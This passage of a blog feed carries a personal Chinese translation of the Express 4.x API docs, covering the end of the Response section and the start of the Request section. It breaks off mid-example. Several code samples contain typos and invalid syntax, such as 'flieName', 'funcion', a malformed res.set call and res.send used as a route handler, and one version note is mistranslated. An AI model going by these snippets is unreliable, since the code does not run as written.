class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>产出<br><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Link:</span>&lt;<span class="symbol">http:</span>/<span class="regexp">/api.example.com/user</span>?page=<span class="number">2</span>&gt;; rel=<span class="string">'next'</span></span><br><span class="line">    <span class="symbol">:&lt;http</span><span class="symbol">://api</span>.example.com/user?page=<span class="number">5</span>&gt;; rel=<span class="string">'last'</span></span><br></pre></td></tr></table></figure></p><h3 id="res-location-path"><a href="#res-location-path" class="headerlink" title="res.location(path)"></a>res.location(path)</h3><p>设置响应<code>location</code>HTTP头为指定的path路径参数<br><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">res</span><span class="selector-class">.location</span>(<span class="string">'/foo/bar'</span>);</span><br><span class="line"><span class="selector-tag">res</span><span class="selector-class">.location</span>(<span class="string">'http://example.com'</span>);</span><br><span class="line"><span class="selector-tag">res</span><span class="selector-class">.location</span>(<span class="string">'back'</span>);</span><br></pre></td></tr></table></figure></p><p>带有<code>back</code>参数的的路径带有特殊的意义，它指的是在请求的<code>Referer</code>报头指定的URL，如果没有被指定，它指向”/“</p><h3 id="res-redirect-status-path"><a href="#res-redirect-status-path" class="headerlink" title="res.redirect([status,] path)"></a>res.redirect([status,] path)</h3><p>重定向URL来自指定的路径，使用指定的HTTP状态码.如果没有指定状态，状态代码默认为’302 Found’<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.redirect(<span class="string">'/foo/bar'</span>);</span><br><span class="line">res.redirect(<span class="string">'http://example.com'</span>);</span><br><span class="line">res.redirect(<span class="number">301</span>,<span class="string">'http://example.com'</span>);</span><br><span class="line">res.redirect(<span class="string">'../login'</span>);</span><br></pre></td></tr></table></figure></p><p>重定向可以完全的将URL重定向到另一个不同的网站<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.redirect(<span class="string">'http://google.com'</span>);</span><br></pre></td></tr></table></figure></p><p>重定向可以使用相对主机的路径，例如，如果你的应用程序是”<a href="http://example.com/admin/post/new&quot;，下面将会将它重定向到&quot;http://example.com/admin&quot;" target="_blank" rel="noopener">http://example.com/admin/post/new&quot;，下面将会将它重定向到&quot;http://example.com/admin&quot;</a><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.redirect(<span class="string">'/admin'</span>)</span><br></pre></td></tr></table></figure></p><p>重定向可以相对于当前的URL，例如来自”<a href="http://example.com/blog/admin/&quot;(注意最后的尾斜杠)，下面将重定向到&quot;http://example.com/blog/admin/post/new&quot;" target="_blank" rel="noopener">http://example.com/blog/admin/&quot;(注意最后的尾斜杠)，下面将重定向到&quot;http://example.com/blog/admin/post/new&quot;</a><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.redirect(<span class="string">'post/new'</span>)</span><br></pre></td></tr></table></figure></p><p>如果上面admin最后没有尾斜杠，将会重定向至”<a href="http://example.com/blog/post/new&quot;" target="_blank" rel="noopener">http://example.com/blog/post/new&quot;</a></p><blockquote><p>如果你发现上述行为令人困惑，把路径段看做目录（尾随斜杠）和文件，他将开始变得有意义</p></blockquote><p>相对路径的重定向也是有可能的，如果你是”<a href="http://example.com/admin/post/new&quot;,下面将会重定向到&quot;http://example.com/admin/post&quot;" target="_blank" rel="noopener">http://example.com/admin/post/new&quot;,下面将会重定向到&quot;http://example.com/admin/post&quot;</a><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.redirect(<span class="string">'..'</span>);</span><br></pre></td></tr></table></figure></p><p>一个<code>back</code>重定向到请求返回<code>referer</code>，如果<code>referer</code>丢失默认为’/‘</p><h3 id="res-render-view-locals-callback"><a href="#res-render-view-locals-callback" class="headerlink" title="res.render(view[,locals][,callback])"></a>res.render(view[,locals][,callback])</h3><p>呈现视图并将HTML发送给客户端，可选参数：</p><ul><li>locals,属性定义视图的局部变量的对象</li><li>callback,回调函数，如果提供的话，返回可能的错误和呈现的字符串，但并不自动响应.当错误发生时,该方法在内部调用<code>next(err)</code><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.render(<span class="string">'index'</span>)</span><br><span class="line"></span><br><span class="line">res.render(<span class="string">'index'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,html</span>)</span>&#123;</span><br><span class="line">    res.send(html)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将局部变量传递给视图</span></span><br><span class="line">res.render(<span class="string">'user'</span>,&#123;<span class="attr">name</span>:<span class="string">'tobi'</span>&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err,html</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><h3 id="res-send-body"><a href="#res-send-body" class="headerlink" title="res.send([body])"></a>res.send([body])</h3><p>发送http响应<br><code>body</code>参数可以是一个<code>buffer</code>对象，字符串，对象，数组.举个栗子：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.send(<span class="keyword">new</span> Buffer(<span class="string">'whoop'</span>))</span><br><span class="line">res.send(&#123;<span class="attr">some</span>:<span class="string">'json'</span>&#125;)</span><br><span class="line">res.send(<span class="string">'&lt;p&gt;some html&lt;/p&gt;'</span>)</span><br><span class="line">res.status(<span class="number">404</span>).send(<span class="string">'sorry,er can not find that!'</span>)</span><br><span class="line">res.status(<span class="number">500</span>).send(&#123;<span class="attr">error</span>:<span class="string">'something brew up'</span>&#125;)</span><br></pre></td></tr></table></figure></p><p>当参数是一个buffer对象时，该方法设置<code>Content-Type</code>响应头字段为<code>application/octet-stream</code>，除非先定义如下所示：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.set(<span class="string">'Content-Type'</span>:<span class="string">'text/html'</span>)</span><br><span class="line">res.send(<span class="keyword">new</span> Buffer(<span class="string">'&lt;p&gt;some html&lt;/p&gt;'</span>))</span><br></pre></td></tr></table></figure></p><p>当参数为字符串时，这个方法设置’Content-Type’为’text/html’<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.send(<span class="string">'&lt;p&gt;some html&lt;/p&gt;'</span>)</span><br></pre></td></tr></table></figure></p><p>当参数为数组或者对象时，Express用JSON表示响应<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.send(&#123;<span class="attr">user</span>:<span class="string">'tobi'</span>&#125;)</span><br><span class="line">res.send([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br></pre></td></tr></table></figure></p><h3 id="res-sendFile-path-options-fn"><a href="#res-sendFile-path-options-fn" class="headerlink" title="res.sendFile(path[,options][,fn])"></a>res.sendFile(path[,options][,fn])</h3><blockquote><p>res.sendFile()在Express v4.8.0之前被支持</p></blockquote><p>在给定路径上传输文件，根据文件的扩展设置”Content-Tpye”响应HTTP头字段.除非在选项对象中设置根选项，路径必须是文件的绝对路径</p><p>下表中列出了选项对象中的详细信息</p><table><thead><tr><th>Property</th><th>Description</th><th>Default</th><th>Availability</th></tr></thead><tbody><tr><td>maxAge</td><td>以毫秒为单位设置max-age缓存控制头或者MS格式的字符串</td><td>0</td><td></td></tr><tr><td>root</td><td>相关文件的根目录</td><td></td><td></td></tr><tr><td>lastModified</td><td>设置last-modified头设置为操作系统上文件的最后修改日期，设置false禁用它</td><td>Enabled</td><td>4.9.0+</td></tr><tr><td>headers</td><td>包含与文件服务对象的HTTP头</td><td></td><td></td></tr><tr><td>dotfiles</td><td>可能值为”allow”,”deny”,”ignore”</td><td>“ignore”</td></tr></tbody></table><p>该方法调用一个回调函数<code>fn(err)</code>当传输完成或发生错误时.如果指定了回调函数并发生错误时，回调函数必须通过终止请求响应周期来显式地处理响应过程，或者传递控制给下一个路由</p><p>下面这个栗子使用了<code>res.sendFile()</code>的所有参数<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.send(<span class="string">'/file/:name'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> options=&#123;</span><br><span class="line">        root:__dirname+<span class="string">'/public'</span>,</span><br><span class="line">        dotfiles:<span class="string">'deny'</span>,</span><br><span class="line">        headers:&#123;</span><br><span class="line">            <span class="string">'x-timestamp'</span>:<span class="built_in">Date</span>.now(),</span><br><span class="line">            <span class="string">'x-sent'</span>:<span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> flieName = req.params.name;</span><br><span class="line">    res.sendFile(fileName,options,funcion(err)&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(err);</span><br><span class="line">            res.status(err.status).end();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'Sent:'</span>, fileName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>res.sendFile()在下面的例子中，提供对文件服务的<code>fine-grained</code>支持，<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'/user/:uid/photos/:file'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> uid = req.params.uid;</span><br><span class="line">    <span class="keyword">var</span> file = req.params.file;</span><br><span class="line"></span><br><span class="line">    req.user.mayViewFilesFrom(uid,<span class="function"><span class="keyword">function</span>(<span class="params">yes</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(yes)&#123;</span><br><span class="line">            res.sendFile(<span class="string">'/uploads/'</span> + uid + <span class="string">'/'</span> + file);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.status(<span class="number">403</span>).send(<span class="string">"sorry you cant\'s see that."</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="res-sendStatus-statusCode"><a href="#res-sendStatus-statusCode" class="headerlink" title="res.sendStatus(statusCode)"></a>res.sendStatus(statusCode)</h3><p>设置响应的HTTP状态码并将字符串形式作为响应体发送<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.sendStatus(<span class="number">200</span>);  <span class="comment">// 等于 res.status(200).send('ok')</span></span><br><span class="line">res.sendStatus(<span class="number">403</span>);  <span class="comment">// 等于 res.status(403).send('Forbidden')</span></span><br><span class="line">res.sendStatus(<span class="number">404</span>);  <span class="comment">// 等于 res.status(404).send('Not Found')</span></span><br><span class="line">res.sendStatus(<span class="number">500</span>);  <span class="comment">// 等于 res.status(500).send('Internal Server Error')</span></span><br></pre></td></tr></table></figure></p><p>如果指定了不受支持的状态代码，HTTP状态仍然设置状态码和代码的字符串版本为响应正文中发送<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.sendStatus(<span class="number">2000</span>)  <span class="comment">// 等于 res.status(2000).send('2000')</span></span><br></pre></td></tr></table></figure></p><p><a href="http://en.wikipedia.org/wiki/List_of_HTTP_status_codes" target="_blank" rel="noopener">More about HTTP Status Codes</a></p><h3 id="res-set-field-value"><a href="#res-set-field-value" class="headerlink" title="res.set(field [,value])"></a>res.set(field [,value])</h3><p>将HTTP响应头filed设置为value值.立即设置多个字段，传递一个对象作为参数<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.set(<span class="string">'Content-Type'</span>:<span class="string">'text/plain'</span>);</span><br><span class="line"></span><br><span class="line">res.set(&#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>:<span class="string">'text.plain'</span>,</span><br><span class="line">    <span class="string">'Content-Length'</span>:<span class="string">'123'</span>,</span><br><span class="line">    <span class="string">'ETag'</span>:<span class="string">'12345'</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>别名为<code>res.header(field[,value])</code></p><h3 id="res-status-code"><a href="#res-status-code" class="headerlink" title="res.status(code)"></a>res.status(code)</h3><p>使用此方法为响应设置HTTP状态，这是一个连贯性的Node <code>response.statusCode</code>别名<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.status(<span class="number">403</span>).send();</span><br><span class="line">res.status(<span class="number">400</span>).send(<span class="string">'Bad Request'</span>);</span><br><span class="line">res.status(<span class="number">404</span>).sendFile(<span class="string">'/absolute/path/to/404.png'</span>)</span><br></pre></td></tr></table></figure></p><h3 id="res-type-type"><a href="#res-type-type" class="headerlink" title="res.type(type)"></a>res.type(type)</h3><p>将<code>Content-Type</code>的HTTP头设置为<code>MIME</code>类型,通过<code>mime.lookup</code>指定类型.如果类型包含’/‘字符，设置”Content-Type”为’type’<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.type(<span class="string">'.html'</span>)  <span class="comment">// =&gt; 'text/html'</span></span><br><span class="line">res.type(<span class="string">'html'</span>)  <span class="comment">// =&gt;'text/html'</span></span><br><span class="line">res.type(<span class="string">'json'</span>) <span class="comment">// =&gt; 'application/json'</span></span><br><span class="line">res.type(<span class="string">'application/json'</span>)  <span class="comment">// =&gt; 'application/json'</span></span><br><span class="line">res.type(<span class="string">'png'</span>) <span class="comment">// =&gt; image/png:</span></span><br></pre></td></tr></table></figure></p><h3 id="res-vary-field"><a href="#res-vary-field" class="headerlink" title="res.vary(field)"></a>res.vary(field)</h3><p>如果它不在那里，添加字段到<code>vary</code>响应头<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.vary(<span class="string">'User-Agent'</span>).render(<span class="string">'docs'</span>);</span><br></pre></td></tr></table></figure></p><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>Express文档中Response部分就完成了，本人学识有限，难免有所纰漏，另外翻译仅仅是方便个人学习交流使用，无其他用意，原文地址：<a href="http://www.expressjs.com.cn/4x/api.html#res" target="_blank" rel="noopener">expressjs.com</a></p>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node </tag>
            
            <tag> express </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Express4.x API (二)：Request (译)</title>
      <link href="/2017/12/20/epxress-api-cn-request/"/>
      <url>/2017/12/20/epxress-api-cn-request/</url>
      
        <content type="html"><![CDATA[<h1 id="Express4-x-API-译文-系列文章"><a href="#Express4-x-API-译文-系列文章" class="headerlink" title="Express4.x API 译文 系列文章"></a>Express4.x API 译文 系列文章</h1><ul><li><a href="http://www.cnblogs.com/okaychen/p/8108405.html" target="_blank" rel="noopener">Express4.x API (一)：application (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8081275.html" target="_blank" rel="noopener">Express4.x API (二)：request (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8087425.html" target="_blank" rel="noopener">Express4.x API (三)：Response (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8093717.html" target="_blank" rel="noopener">Express4.x API (四)：router (译) – 完成</a><a id="more"></a><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1>最近学习express想要系统的过一遍API，<a href="www.expressjs.com">www.expressjs.com</a>是express英文官网(进入<a href="www.epxressjs.com.cn">www.epxressjs.com.cn</a>发现也是只有前几句话是中文呀~~)，所以自己准备在express学习的过程也翻译一遍API，一是熟悉Express文档，二是锻炼自己英语阅读能力.</li></ul><blockquote><p>原文地址：<a href="http://www.expressjs.com.cn/4x/api.html#req" target="_blank" rel="noopener">express.com</a></p></blockquote><h1 id="Request-请求"><a href="#Request-请求" class="headerlink" title="Request(请求)"></a>Request(请求)</h1><p><code>req</code>代表<code>http request</code>请求，具有请求查询字符串，参数，body，http头等等的性能。在本文件和惯例中，这个对象总是被简称为<code>req</code>(<code>http response</code>对象是<code>res</code>),但是它的实际名称取决于你正在工作的回调函数的参数</p><p>举个栗子：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'/user/:id/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'user'</span> + req.params.id);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>当然你也可以这样：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'user/"id/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">request,response</span>)</span>&#123;</span><br><span class="line">    response.send(<span class="string">'user '</span> + request.params.id);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><blockquote><p>在express4.x中，<code>req.files</code>在默认情况下是不再可以被使用的，在<code>req.files</code>对象为了获得<code>upload files</code>，使用多个处理中间件,像 <code>busboy,formidable,multiparty,connect-multiparty</code>或者<code>pez</code></p></blockquote><h3 id="req-app"><a href="#req-app" class="headerlink" title="req.app"></a>req.app</h3><p>此属性持有对使用中间件的Express应用程序实例的引用</p><p>如果你按照所创建的一个模块，刚暴露一个中间件为了在你的主文件中使用它，然后中间件可以通过<code>req.app</code>访问Express实例</p><p>举个栗子：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index</span></span><br><span class="line">app.get(<span class="string">"/viewdirectory/"</span>,<span class="built_in">require</span>(<span class="string">"./mymiddleware.js"</span>))</span><br></pre></td></tr></table></figure></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// mymiddleware.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'The views direction is " + req.app.get('</span>views<span class="string">'));</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="req-baseUrl"><a href="#req-baseUrl" class="headerlink" title="req.baseUrl"></a>req.baseUrl</h3><p>安装路由器的实例的URL路径</p><p>举个栗子：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> greet = express.Router();</span><br><span class="line">greet.get(<span class="string">'/jp'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(req.baseUrl)  <span class="comment">// greet</span></span><br><span class="line">    res.send(<span class="string">'Konichiwa!'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">'/greet'</span>,greet)  <span class="comment">// load the router on '/greet'</span></span><br></pre></td></tr></table></figure></p><p>即使使用路径模式或一组路径模式来加载路由器，<code>baseUrl</code>特性返回匹配字符串，而不是模式(s),</p><p>在下面这个路径中，<code>greet</code>路径加载两个路由路径<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use([<span class="string">'/gre+t'</span>,<span class="string">'hel&#123;2&#125;o'</span>],greet)   <span class="comment">// load the router on '/gre+t' and '/hel&#123;2&#125;o'</span></span><br></pre></td></tr></table></figure></p><p>当一个请求指向<code>/greet/jp</code>,<code>req.baseUrl</code>是’/greet’.当一个请求指向<code>/hello/jp</code>,<code>req.baseUrl</code>是<code>/hello</code><br><code>req.baseUrl</code>类似于<code>app.mountpath</code>,除了<code>app.mountpath</code>返回路径匹配的模式</p><h3 id="req-body"><a href="#req-body" class="headerlink" title="req.body"></a>req.body</h3><p>包含请求主体中提交数据的键值对.默认情况下，它是<code>undefined</code>,当时用<code>body-parsing</code>中间件例如<code>body-parser</code>和<code>multer</code>时被填充</p><p>下面这个栗子展示如何使用中间件来填充<code>req.body</code><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>)</span><br><span class="line"><span class="keyword">var</span> multer = <span class="built_in">require</span>(<span class="string">'multer'</span>)</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.json());   <span class="comment">// 解析 application/json</span></span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>:<span class="literal">true</span>&#125;));   <span class="comment">// 解析 application/x-www-form-urlencoded</span></span><br><span class="line">app.use(multer())  <span class="comment">// 解析multipart/form-data</span></span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(req.body)</span><br><span class="line">    res.json(req.body)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="req-cookies"><a href="#req-cookies" class="headerlink" title="req.cookies"></a>req.cookies</h3><p>当使用cookie-parser中间件，此属性是包含请求发送的cookie对象.如果请求不包含cookie，它默认为<code>{}</code><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Cookie:name = tj</span></span><br><span class="line">req.cookies.name  <span class="comment">// =&gt;"tj"</span></span><br></pre></td></tr></table></figure></p><h3 id="req-fresh"><a href="#req-fresh" class="headerlink" title="req.fresh"></a>req.fresh</h3><p>指示是否这个请求是”fresh”，他是和<code>req.stale</code>相反的。这是真的如果<code>cache-control</code>请求头没有一个<code>no-cache</code>指令，下面一项都是正确的：</p><ul><li>这个<code>if-modified-since</code>请求头是明确指定的，<code>last-modified</code>请求头等于或者更早于<code>modified</code>响应头</li><li><code>if-none-match</code>请求头是*</li><li><code>if-none-match</code>请求头，在解析到他的指令之后，不匹配<code>etag</code>的响应头</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">req.fresh <span class="comment">// =&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="req-hostname"><a href="#req-hostname" class="headerlink" title="req.hostname"></a>req.hostname</h3><p>包含主机<code>host</code> http header的主机名<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HOST:“expample.com:3000”</span></span><br><span class="line">req.hostname <span class="comment">// =&gt; elample.com</span></span><br></pre></td></tr></table></figure></p><h3 id="req-ip"><a href="#req-ip" class="headerlink" title="req.ip"></a>req.ip</h3><p>请求的远程ip地址<br>如果信用代理<code>trust proxy</code>被设置为启用,它是<code>upstream</code>地址<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">req.ip  <span class="comment">// =&gt; 127.0.0.1</span></span><br></pre></td></tr></table></figure></p><h3 id="req-ips"><a href="#req-ips" class="headerlink" title="req.ips"></a>req.ips</h3><p>如果信用代理<code>trust proxy</code>被设置为启用,此属性在<code>X-Forwards-For</code>请求头包含指定的ip地址数组，否者他包含一个空数组.</p><h3 id="req-orignalUrl"><a href="#req-orignalUrl" class="headerlink" title="req.orignalUrl"></a>req.orignalUrl</h3><blockquote><p>req.url不是express的本身的属性，它是从节点的http模块继承来的</p></blockquote><p>这个属性和req.url非常相似，然而它保留起初的url请求,允许你自由的重req.url用于内部路由的目的。举个栗子，<code>app.use()</code>的’mounting’特性将会重写req.url的挂载点<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  GET /serch?q=somting</span></span><br><span class="line">req.orignalUrl <span class="comment">//  =&gt; "/serch?q=somthing"</span></span><br></pre></td></tr></table></figure></p><h3 id="req-params"><a href="#req-params" class="headerlink" title="req.params"></a>req.params</h3><p>一个包含映射到命名路由”参数”的属性对象。举个栗子,如果你有这样的路由<code>/user:name</code>,然后这个”name”属性可以被作为<code>req.params.name</code>。这个对象默认为{}<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GTE /user/tj</span></span><br><span class="line">req.parmas.name <span class="comment">// =&gt; "tj"</span></span><br></pre></td></tr></table></figure></p><p>当你使用正则表达式作为路由定义时，捕获组（capture group）在数组中使用req.params[n],其中n是第n个捕获组，此规则应用于未命名通配符通配符匹配，比如<code>/file/*</code><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GET /file/javascripts/jquery.js</span></span><br><span class="line">req.params[<span class="number">0</span>]  <span class="comment">// =&gt; "javascript/jquery.js"</span></span><br></pre></td></tr></table></figure></p><h3 id="req-path"><a href="#req-path" class="headerlink" title="req.path"></a>req.path</h3><p>包含<code>request url</code>的部分路径</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// example.com/users?sort=decs</span></span><br><span class="line">req.path  <span class="comment">// =&gt; "/users"</span></span><br></pre></td></tr></table></figure><blockquote><p>当从中间件调用时，挂载点不包含在<code>req.path</code></p></blockquote><h3 id="req-protocol"><a href="#req-protocol" class="headerlink" title="req.protocol"></a>req.protocol</h3><p>请求协议字符串,当使用TSL请求时：http或者https。当（trust proxy）信任代理设置信任（scokets address）套接字，这个’X-Forward-Proto’的header（http，https）领域值将会被信任<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">req.protocol()  <span class="comment">// =&gt; "http"</span></span><br></pre></td></tr></table></figure></p><h3 id="req-query"><a href="#req-query" class="headerlink" title="req.query"></a>req.query</h3><p>包含路由中每个查询字符串参数的属性的对象，如果没有查询字符串，它是一个空对象{}<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GET /serch?q=tobi+ferret</span></span><br><span class="line">req.query.q  <span class="comment">// "tobi ferret"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// GET /shoes?order=decs&amp;shoe[color]=blue&amp;shoe[type]=converse</span></span><br><span class="line">req.query.order  <span class="comment">// =&gt; "desc"</span></span><br><span class="line"></span><br><span class="line">req.query.shoe.color  <span class="comment">// =&gt; "blue"</span></span><br><span class="line"></span><br><span class="line">req.query.shoe.type  <span class="comment">// =&gt; "converse"</span></span><br></pre></td></tr></table></figure></p><h3 id="req-route"><a href="#req-route" class="headerlink" title="req.route"></a>req.route</h3><p>当前匹配的路由，字符串</p><p>举个栗子：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'/user/:id?'</span>,functon userIdHandler(req,res)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(req.route);</span><br><span class="line">    res.send(<span class="string">'GET'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>示例上一段代码的输出：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    path:<span class="string">'user/:id?'</span>,</span><br><span class="line">    stack:</span><br><span class="line">    [</span><br><span class="line">        &#123;</span><br><span class="line">            handle:[<span class="built_in">Function</span>:userIdHandler],</span><br><span class="line">            name:<span class="string">'userIdHandler'</span>,</span><br><span class="line">            params:undefind,</span><br><span class="line">            path:undefind,</span><br><span class="line">            keys:[],</span><br><span class="line">            regexp:<span class="regexp">/^\/?$/i</span>,</span><br><span class="line">            method:<span class="string">'get'</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    methods:&#123;<span class="attr">get</span>:<span class="literal">true</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="req-secure"><a href="#req-secure" class="headerlink" title="req.secure"></a>req.secure</h3><p>如果建立的TSL连接，则为真的布尔值，相当于<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">'https'</span> == req.protocol;</span><br></pre></td></tr></table></figure></p><h3 id="req-signedCookies"><a href="#req-signedCookies" class="headerlink" title="req.signedCookies"></a>req.signedCookies</h3><p>当使用<code>cookie-parser</code>中间件时，此属性包含请求发送签署的cookie，为签名并以准备好使用，签署的cookie驻留在不同的对象中以显示开发人员的意图.否者，恶意攻击可以放置req.cookie值(这是容易欺骗的).注意签署cookie并不能使其隐藏或加密，当时简单的防止篡改（因为用于签署的secret是私有的）.如果没有发送签署的cookie，则默认为{}<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Cookie: user=tobi.CP7AWaXDfAKIRfH49dQzKJx7sKzzSoPq7/AcBBRVwlI3</span></span><br><span class="line">req.signedCookies.user  <span class="comment">// =&gt; "tobi"</span></span><br></pre></td></tr></table></figure></p><h3 id="req-stale"><a href="#req-stale" class="headerlink" title="req.stale"></a>req.stale</h3><p>指示是否请求是<code>stable</code>,和它对应的是<code>req.fresh</code><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">req.stable  <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><h3 id="req-subdomains"><a href="#req-subdomains" class="headerlink" title="req.subdomains"></a>req.subdomains</h3><p>请求的域名中的一组子域<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HOST： 'tobi.ferrets.example.com'</span></span><br><span class="line">req.subdomains  <span class="comment">// =&gt; ["tobi","ferrets"]</span></span><br></pre></td></tr></table></figure></p><h3 id="req-xhr"><a href="#req-xhr" class="headerlink" title="req.xhr"></a>req.xhr</h3><p>如果请求的<code>X-Requsested-With</code>头域是<code>XMLHttpRequest</code>，布尔值为true.指示请求是由一个客户库（如jQuery）发出的<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">req.xhr <span class="comment">// =&gt; true</span></span><br></pre></td></tr></table></figure></p><h2 id="Methods"><a href="#Methods" class="headerlink" title="Methods"></a>Methods</h2><h3 id="req-accepts-types"><a href="#req-accepts-types" class="headerlink" title="req.accepts(types)"></a>req.accepts(types)</h3><p>检查指定的内容类型是否可接受，基于请求的<code>Accept</code>http字段.该方法返回最佳匹配,或者如果没有指定内容类型是可以接受的，返回<code>undefined</code>(在这种情况下，应用程序回应以406<code>Not Acceptable</code>)</p><p>类型值可以是单个MIME类型字符串（例如’application/json’）,一个扩展名例如’.json’,逗号分割的列表或者是一个数组.对于列表和数组，该方法返回最佳匹配（如果有的话）<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Accept : text/html</span></span><br><span 